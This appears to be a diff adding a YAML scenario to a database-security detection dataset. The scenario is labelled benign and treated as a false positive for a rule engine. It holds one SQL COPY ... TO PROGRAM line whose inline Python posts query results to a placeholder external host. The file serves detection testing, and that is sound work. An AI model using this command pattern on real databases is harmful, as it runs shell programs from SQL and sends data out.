@@ -1,0 +1,31 @@
+scenario_id: gen_ecommerce_93_copy_to_program_ben_2849b
+family_id: gen_ecommerce_93_copy_to_program_fam_2849
+domain: ecommerce
+time_of_day: 02:20
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT product_id, name FROM products WHERE status = 'shipped') TO
+      PROGRAM 'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://clearinghouse-batch.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 198.51.100.170
+      port: 9443
+matched_pair_id: gen_ecommerce_93_copy_to_program_pair_2849
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
